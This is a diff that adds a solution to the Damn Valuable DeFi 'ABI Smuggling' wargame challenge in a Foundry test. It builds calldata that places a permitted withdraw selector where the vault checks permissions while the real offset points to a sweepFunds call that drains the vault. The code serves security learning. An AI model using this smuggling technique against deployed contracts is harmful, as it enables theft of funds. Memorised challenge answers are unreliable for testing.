@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,31 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // The call we actually want executed: sweepFunds(recovery, token).
+        // The player is NOT authorized for this selector (0x85fb709d) --
+        // only the deployer is.
+        bytes memory sweepCall = abi.encodeWithSelector(
+            SelfAuthorizedVault.sweepFunds.selector,
+            recovery,
+            address(token)
+        );
+
+        // Hand-craft calldata for execute(address,bytes) so that:
+        //  - the fixed byte-100 position the permission check reads contains
+        //    withdraw's selector (0xd9caed12), which the player IS authorized for
+        //  - the real ABI offset points elsewhere, to where sweepCall actually lives
+        bytes memory attackCalldata = abi.encodePacked(
+            vault.execute.selector,                         // 4 bytes: outer selector
+            bytes32(uint256(uint160(address(vault)))),       // W0: target = vault
+            bytes32(uint256(0x80)),                          // W1: actionData offset = 128 (non-canonical)
+            bytes32(uint256(0)),                             // W2: filler, unused
+            bytes32(bytes4(vault.withdraw.selector)),        // W3: fake selector read at byte 100
+            bytes32(uint256(sweepCall.length)),              // real length word (68)
+            sweepCall                                        // real actionData content
+        );
+
+        (bool success, bytes memory ret) = address(vault).call(attackCalldata);
+        require(success, string(ret));
     }
 
     /**
